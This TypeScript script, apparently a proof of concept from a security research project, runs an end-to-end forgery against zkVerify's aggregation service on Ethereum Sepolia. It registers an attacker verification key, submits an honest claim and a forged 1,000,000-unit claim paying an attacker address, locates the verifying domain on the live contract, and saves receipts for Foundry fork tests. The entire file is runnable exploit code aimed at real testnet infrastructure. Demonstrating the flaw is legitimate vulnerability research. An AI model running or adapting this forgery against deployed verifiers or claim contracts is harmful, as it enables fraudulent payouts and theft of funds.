// End-to-end forgery against zkVerify's REAL aggregation on Ethereum Sepolia:
//   1. register the claim VK and the attacker VK with zkVerify (Kurier testnet)
//   2. prove an honest claim (500) and a forged claim (1,000,000 to the attacker)
//   3. submit both with chainId 11155111 and wait until each job is Aggregated
//   4. find the domain id by asking zkVerify's Sepolia contract which one verifies the leaf
//   5. write contracts/fixtures/receipts.json for the Foundry fork tests
// Usage: node packages/forge/src/attack.ts   (needs KURIER_API_KEY in elenchos/.env; fails loudly without it)
import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { createPublicClient, http, parseAbi, type Hex } from 'viem';
import { sepolia } from 'viem/chains';
import { registerVk, submitProof, waitForAggregation, type AggregationReceipt } from './kurier.ts';
import { poseidon1, proveClaim, proveForgery, shutdownProver, type ProofResult } from './prove.ts';
import { groth16Statement } from './statement.ts';

const ROOT = fileURLToPath(new URL('../../../', import.meta.url));
try { process.loadEnvFile(`${ROOT}.env`); } catch { /* .env optional; key check below fails loudly */ }

const ZKVERIFY = (process.env.ZKVERIFY_SEPOLIA ?? '0xEA0A0f1EfB1088F4ff0Def03741Cb2C64F89361E') as Hex;
const client = createPublicClient({ chain: sepolia, transport: http(process.env.SEPOLIA_RPC_URL ?? 'https://ethereum-sepolia-rpc.publicnode.com') });
const abi = parseAbi(['function verifyProofAggregation(uint256,uint256,bytes32,bytes32[],uint256,uint256) view returns (bool)']);
const log = (...a: unknown[]) => console.log(new Date().toISOString().slice(11, 19), ...a);

async function domainFor(r: AggregationReceipt, leaf: Hex): Promise<number> {
  const candidates = [...new Set([r.domainId, 0, 1, 2, 3, 4, 5].filter((d): d is number => d !== undefined))];
  for (const d of candidates) {
    const ok = await client.readContract({ address: ZKVERIFY, abi, functionName: 'verifyProofAggregation',
      args: [BigInt(d), BigInt(r.aggregationId), leaf, r.merkleProof, BigInt(r.numberOfLeaves), BigInt(r.leafIndex)] });
    if (ok) return d;
  }
  throw new Error(`no domain id verifies aggregation ${r.aggregationId} on Sepolia (tried ${candidates.join(', ')}); the receipt is not usable yet`);
}

async function run(label: string, p: ProofResult) {
  log(`${label}: registering VK`);
  const vkHash = (await registerVk(p.vk)) as Hex;
  log(`${label}: vkHash ${vkHash}; submitting proof (chainId 11155111)`);
  const jobId = await submitProof(p.proof, p.publicSignals, vkHash);
  log(`${label}: job ${jobId}`);
  const r = await waitForAggregation(jobId, (s) => log(`${label}: ${s}`));
  const inputs = p.publicSignals.map(BigInt);
  const leaf = groth16Statement(vkHash, inputs);
  if (r.leaf && r.leaf.toLowerCase() !== leaf.toLowerCase()) {
    throw new Error(`${label}: our statement hash ${leaf} differs from zkVerify's leaf ${r.leaf}`);
  }
  const domainId = await domainFor(r, leaf);
  log(`${label}: aggregated (id ${r.aggregationId}, domain ${domainId}, leaf ${leaf})`);
  return {
    vkHash, domainId, aggregationId: r.aggregationId, inputs: p.publicSignals, merklePath: r.merkleProof,
    leafCount: r.numberOfLeaves, index: r.leafIndex, leaf, jobId, txHash: r.txHash ?? null, statuses: r.statuses,
  };
}

const attacker = BigInt(process.env.ELENCHOS_ATTACKER ?? '0xA11cE000000000000000000000000000000A11cE');
const secret = BigInt(Date.now()) * 7919n;
const nullifier = await poseidon1(secret);
const honest = await proveClaim(0xB0bn, 500n, secret, nullifier);
const forged = await proveForgery(attacker, 1_000_000n, BigInt(Date.now()));
await shutdownProver();
log(`proofs ready: honest ${honest.ms} ms, forged ${forged.ms} ms (both verified locally)`);

const [h, f] = await Promise.all([run('honest', honest), run('forged', forged)]);
const out = `${ROOT}contracts/fixtures/receipts.json`;
if (!existsSync(`${ROOT}contracts/fixtures`)) mkdirSync(`${ROOT}contracts/fixtures`, { recursive: true });
writeFileSync(out, JSON.stringify({ network: 'sepolia', zkVerify: ZKVERIFY, createdAt: new Date().toISOString(), honest: h, forged: f }, null, 2));
log(`wrote ${out}. Next: cd contracts && forge test --match-contract ForgedReceiptFork --fork-url $SEPOLIA_RPC_URL`);
